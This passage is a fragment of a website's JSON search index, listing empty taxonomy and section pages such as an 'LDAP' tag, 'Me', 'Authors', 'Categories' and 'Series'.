2026","externalUrl":null,"permalink":"/tags/ldap/","section":"Tags","summary":"","title":"LDAP","type":"tags"},{"content":"","date":"8 February 2026","externalUrl":null,"permalink":"/me/","section":"Me","summary":"","title":"Me","type":"me"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]